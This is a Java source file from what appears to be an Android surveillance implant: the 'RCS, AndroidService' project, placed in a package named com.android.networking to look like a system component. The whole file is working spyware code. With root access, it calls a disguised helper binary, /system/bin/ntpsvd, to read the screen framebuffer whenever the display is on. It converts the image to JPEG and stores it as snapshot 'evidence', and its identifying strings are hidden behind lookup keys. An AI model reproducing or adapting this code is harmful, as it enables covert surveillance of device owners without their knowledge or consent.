/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SnapshotAgent.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Matrix;
import android.media.MediaRecorder;
import android.os.Build;
import android.view.Display;
import android.view.Surface;
import android.view.WindowManager;

import com.android.networking.LogR;
import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.ThreadBase;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;
import com.android.networking.conf.ConfigurationException;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.file.AutoFile;
import com.android.networking.listener.ListenerStandby;
import com.android.networking.util.Check;
import com.android.networking.util.DataBuffer;
import com.android.networking.util.Utils;
import com.android.networking.util.WChar;

/**
 * The Class SnapshotAgent.
 */
public class ModuleSnapshot extends BaseInstantModule {

	private static final String TAG = "ModuleSnapshot"; //$NON-NLS-1$
	private static final int LOG_SNAPSHOT_VERSION = 2009031201;
	private static final int MIN_TIMER = 1 * 1000;
	private static final long SNAPSHOT_DELAY = 1000;

	final Display display = ((WindowManager) Status.getAppContext()
			.getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();
	
	/** The Constant CAPTURE_FULLSCREEN. */
	final private static int CAPTURE_FULLSCREEN = 0;

	/** The Constant CAPTURE_FOREGROUND. */
	final private static int CAPTURE_FOREGROUND = 1;

	/** The delay. */
	private int delay;

	/** The type. */
	private int type;
	private int quality;

	/**
	 * Instantiates a new snapshot agent.
	 */
	public ModuleSnapshot() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " SnapshotAgent constructor");//$NON-NLS-1$
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {
		try {
			String qualityParam = conf.getString("quality");
			if ("low".equals(qualityParam)) {
				quality = 50;
			} else if ("med".equals(qualityParam)) {
				quality = 70;
			} else if ("high".equals(qualityParam)) {
				quality = 90;
			}
		} catch (ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
		}

		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public synchronized void actualStart() {
		try {
			if (Status.self().haveRoot()) {
				final boolean isScreenOn = ListenerStandby.isScreenOn();

				if (!isScreenOn) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (go): Screen powered off, no snapshot");//$NON-NLS-1$
					}
					
					return;
				}

				final Display display = ((WindowManager) Status.getAppContext()
						.getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();

				int width, height, w, h;
				final int orientation = display.getOrientation();

				if (isTablet()) {
					h = display.getWidth();
					w = display.getHeight();
				} else {
					w = display.getWidth();
					h = display.getHeight();
				}

				boolean useOrientation = true;
				boolean useMatrix = true;

				if (!useOrientation || orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
					width = w;
					height = h;
				} else {
					height = w;
					width = h;
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (go): w=" + width + " h=" + height);//$NON-NLS-1$ //$NON-NLS-2$
				}

				// 0: invertito blu e rosso
				// 1: perdita info
				// 2: invertito blu e verde
				// 3: no ARGB, no ABGR, no AGRB
				byte[] raw = getRawBitmap();

				if (raw == null || raw.length == 0) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (actualStart): raw bitmap is null or has 0 length"); //$NON-NLS-1$
					}
					
					return;
				}
				
				if (usesInvertedColors()) {
					// sul tablet non e' ARGB ma ABGR.
					byte[] newraw = new byte[raw.length / 2];

					for (int i = 0; i < newraw.length; i++) {
						switch (i % 4) {
							case 0:
								newraw[i] = raw[i + 2]; // A 3:+2
								break;
							case 1:
								newraw[i] = raw[i]; // R 1:+2 2:+1
								break;
							case 2:
								newraw[i] = raw[i - 2]; // G 2:-1 3:-2
								break;
							case 3:
								newraw[i] = raw[i]; // B 1:-2
								break;
						}
						/*
						 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
						 * else if (i % 4 == 1) newraw[i] = raw[i]; // R 1:+2
						 * 2:+1 else if (i % 4 == 2) newraw[i] = raw[i - 2]; //
						 * G 2:-1 3:-2 else if (i % 4 == 3) newraw[i] = raw[i];
						 * // B 1:-2
						 */
					}
					
					raw = newraw;
				}

				if (raw != null) {
					Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);

					ByteBuffer buffer = ByteBuffer.wrap(raw);
					bitmap.copyPixelsFromBuffer(buffer);
					buffer = null;
					raw = null;

					int rotateTab = 0;

					if (isTablet()) {
						rotateTab = -90;
					}

					if (useMatrix && orientation != Surface.ROTATION_0) {
						final Matrix matrix = new Matrix();

						if (orientation == Surface.ROTATION_90) {
							matrix.setRotate(270 + rotateTab);
						} else if (orientation == Surface.ROTATION_270) {
							matrix.setRotate(90 + rotateTab);
						} else if (orientation == Surface.ROTATION_180) {
							matrix.setRotate(180 + rotateTab);
						} else {
							matrix.setRotate(rotateTab);
						}

						bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
					}

					byte[] jpeg = toJpeg(bitmap);
					bitmap = null;

					new LogR(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
					jpeg = null;
				}
			}
		} catch (final Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (go) Error: " + ex);//$NON-NLS-1$
				Check.log(ex);//$NON-NLS-1$
			}
		}

	}

	private boolean isTablet() {
		int w = display.getWidth();
		int h = display.getHeight();
		
		if ((w == 600 && h == 1024) || (w == 1024 && h == 600)) {
			return true;
		}
		
		String model = Build.MODEL.toLowerCase();

		// Samsung Galaxy Tab
		if (model.contains("gt-p7500")) {
			return true;
		}
		
		return false;
	}
	
	private boolean usesInvertedColors() {
		String model = Build.MODEL.toLowerCase();

		// Samsung Galaxy Tab
		if (model.contains("gt-p7500")) {
			return true;
		}
		
		// Samsung Galaxy S2
		if (model.contains("gt-i9100")) {
			return true;
		}
		
		return false;
	}
	
	private byte[] getAdditionalData() {
		final String window = Messages.getString("11.1"); //$NON-NLS-1$

		final int wlen = window.length() * 2;
		final int tlen = wlen + 24;
		final byte[] additionalData = new byte[tlen];

		final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen);

		databuffer.writeInt(LOG_SNAPSHOT_VERSION); // version
		databuffer.writeInt(0); // process name len
		databuffer.writeInt(wlen); // windows name len

		byte[] windowsName = new byte[wlen];
		windowsName = WChar.getBytes(window);
		databuffer.write(windowsName);

		return additionalData;
	}

	private byte[] toJpeg(Bitmap bitmap) {

		ByteArrayOutputStream os = new ByteArrayOutputStream();
		bitmap.compress(Bitmap.CompressFormat.JPEG, quality, os);

		final byte[] array = os.toByteArray();
		try {
			os.close();
			os = null;

		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}
		return array;

	}

	private byte[] getRawBitmap() {
		final File filesPath = Status.getAppContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();

		final String getrawpath = Messages.getString("11.2"); //$NON-NLS-1$

		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getRawBitmap): calling frame generator");
			}
			
			final Process localProcess = Runtime.getRuntime().exec(new String[]{"/system/bin/ntpsvd","fb"});
			localProcess.waitFor();
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
			}

			final AutoFile file = new AutoFile(path, Messages.getString("11.3")); //$NON-NLS-1$
			
			if (file.exists()) {
				return file.read();
			}
		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		} catch (final InterruptedException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}

		return null;
	}

}
